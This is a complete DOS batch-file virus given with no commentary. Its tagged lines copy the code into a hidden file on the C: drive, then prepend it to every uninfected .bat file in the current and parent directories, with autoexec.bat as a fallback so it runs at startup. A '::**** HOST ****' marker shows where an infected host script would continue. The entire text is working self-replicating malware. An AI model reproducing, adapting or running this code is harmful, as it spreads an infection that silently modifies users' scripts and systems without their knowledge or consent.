@echo off%_InS%
if '%1==' InS goto InS%2
set InS=%0.bat
if not exist %InS% set InS=%0
if '%InS%==' set InS=autoexec.bat
if exist c:\InS_.bat goto InSg
if not exist %InS% goto eInS
find "InS"<%InS%>c:\_InS.bat
attrib c:\_InS.bat +h
:InSg
command /c c:\_InS InS vir
if exist t$f? del t$f?>nul.InS
:eInS
set InS=
goto InSend
:InSvir
for %%a in (*.bat ..\*.bat) do call c:\_InS InS i %%a
exit InS
:InSi
find "InS"<%3>t$f1
if exist t$f2 del t$f2>nul.InS
copy t$f1 t$f2>nul.InS
if exist t$f2 goto InSend
type c:\_InS.bat>InS$
type %3>>InS$
copy InS$ %3>nul
del InS$
exit InS
:InSend
::**** HOST ****
